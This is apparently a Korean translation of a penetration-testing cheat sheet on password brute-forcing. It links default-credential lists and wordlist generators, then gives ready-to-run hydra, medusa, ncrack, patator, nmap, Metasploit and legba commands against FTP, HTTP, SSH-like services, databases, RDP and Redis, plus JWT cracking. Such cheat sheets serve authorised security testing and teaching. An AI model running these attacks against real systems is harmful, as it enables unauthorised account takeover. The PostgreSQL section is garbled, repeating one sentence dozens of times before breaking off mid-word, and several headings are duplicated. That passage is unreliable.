# 브루트 포스 - 치트시트

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>제로부터 히어로까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나**트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 자격 증명

사용 중인 기술의 기본 자격 증명을 검색하거나 다음 링크를 시도하세요:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **사용자 정의 사전 만들기**

대상에 대한 정보를 최대한 찾아서 사용자 정의 사전을 생성하세요. 도움이 될 수 있는 도구:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl은 웹 사이트에서 텍스트를 추출하는 데 사용되는 도구입니다. 일반적으로 웹 사이트의 콘텐츠를 분석하고 사용자가 생성한 단어 목록을 만들 때 사용됩니다.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

피해자에 대한 지식(이름, 날짜 등)을 기반으로 암호를 생성합니다.
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

특정 대상과 관련된 사용하기 적합한 고유한 워드리스트를 생성할 수 있도록 주어진 단어 집합을 제공하여 여러 가지 변형을 만들 수 있는 워드리스트 생성 도구입니다.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 단어 목록

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 서비스

서비스 이름별 알파벳순으로 정렬됨.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a binary protocol that can be used to proxy requests from a web server to a Java application server. It is similar to HTTP, but more efficient for communicating with Java application servers. AJP is often used in combination with the Apache Tomcat server.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### 카산드라
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB는 NoSQL 데이터베이스로, 일반적으로 HTTP API를 통해 상호 작용합니다. Brute force 공격을 방지하기 위해 CouchDB는 기본적으로 인증을 요구합니다. Brute force 공격을 수행하려면 사용자 이름과 비밀번호를 알아야 합니다.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### 도커 레지스트리
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

### 엘라스틱서치
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP는 파일 전송 프로토콜을 나타냅니다. 호스트에 대한 액세스를 얻기 위해 무차별 대입 공격을 시도할 때 사용할 수 있습니다. 일반적으로 사용자 이름과 비밀번호를 대입하여 시도하며, 성공할 경우 파일 시스템에 액세스할 수 있습니다.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP 일반 무차별 대입

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP 기본 인증
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - 포스트 폼
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
**HTTP - CMS --** (W)ordpress, (J)oomla 또는 (D)rupal 또는 (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. IMAP permits a user to access and manage their email messages as if they were stored locally on their device.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat)는 인터넷 상에서 실시간으로 대화를 나누는 프로토콜입니다. 사용자는 채널에 참여하여 메시지를 교환할 수 있습니다. IRC 채널은 종종 해킹 및 보안 관련 주제로 사용되며, 정보 교환과 협업에 유용합니다.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT(Json Web Token)은 웹 토큰을 나타내는 표준이다. 이는 클레임(claim)을 안전하게 전송하기 위한 컴팩트하고 자가수용적인 방법을 제공한다. JWT는 URL, POST 매개변수 또는 HTTP 헤더에 넣어서 전송할 수 있다.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP은 Lightweight Directory Access Protocol의 약자로, 네트워크 디렉터리 서비스를 사용하여 사용자 정보 및 자원을 관리하는 데 사용됩니다. LDAP에 대한 브루트 포스 공격은 일반적으로 사용자 자격 증명을 추측하기 위해 여러 암호를 시도하는 공격입니다.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

### MQTT
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### 몽고DB
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

### MSSQL
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL은 오픈 소스 관계형 데이터베이스 관리 시스템이다. MySQL 데이터베이스에 대한 브루트 포스 공격은 일반적으로 사용자 이름과 비밀번호를 대입하여 데이터베이스에 무단으로 액세스하려는 시도를 의미한다. 이러한 유형의 공격은 보안 취약점을 악용하거나 약한 인증 자격 증명을 찾는 데 사용될 수 있다. MySQL 브루트 포스 도구는 대부분의 경우 자동화된 스크립트로 실행되며, 강력한 암호 정책을 적용하여 이러한 유형의 공격으로부터 시스템을 보호할 수 있다.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

오라클 데이터베이스에 대한 무차별 대입 공격은 일반적으로 다음과 같은 방법으로 수행됩니다:

1. **사전 공격**: 가장 일반적인 방법으로, 미리 정의된 단어 목록(사전)을 사용하여 대상 시스템에 대해 대입을 시도합니다.
2. **숫자 대입**: 숫자 조합을 사용하여 모든 가능한 숫자 조합을 시도합니다.
3. **알파벳 대입**: 알파벳 조합을 사용하여 모든 가능한 알파벳 조합을 시도합니다.
4. **특수 문자 대입**: 특수 문자 조합을 사용하여 모든 가능한 특수 문자 조합을 시도합니다.
5. **하이브리드 대입**: 알파벳, 숫자 및 특수 문자의 조합을 사용하여 대입을 시도합니다.

이러한 방법은 오라클SQL 데이터베이스에 대한 무차별 대입 공격을 수행하는 데 사용됩니다.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
**oracle_login**을 **patator**와 함께 사용하려면 다음을 **설치**해야 합니다:
```bash
pip3 install cx_Oracle --upgrade
```
[오프라인 OracleSQL 해시 브루트포스](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**버전 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 그리고 **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP는 "Post Office Protocol"의 약자로, 이메일 클라이언트가 이메일 서버에서 이메일을 가져오는 데 사용되는 프로토콜입니다. POP는 일반적으로 110번 포트를 사용하며, 사용자의 이메일함에서 이메일을 다운로드하는 데 사용됩니다.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL은 인기 있는 오픈 소스 관계형 데이터베이스 시스템입니다. PostgreSQL 브루트 포스는 일반적으로 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로 암호화되지 않은 인증 정보를 찾기 위해 사용됩니다. PostgreSQL 브루트 포스는 대상 시스템에 대한 암호 또는 인증 정보를 찾기 위해 사용됩니다. 일반적으로
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 설치할 `.deb` 패키지를 다운로드할 수 있습니다.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

### 레디스
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

### Rexec

Rexec는 원격 실행 서비스를 사용하여 사용자가 원격 시스템에 로그인할 수 있도록 하는 프로토콜입니다. Rexec 서비스는 일반적으로 TCP 포트 512에서 실행됩니다. Brute force 공격을 수행하여 Rexec 서비스에 대한 자격 증명을 얻을 수 있습니다.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

### Rlogin
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

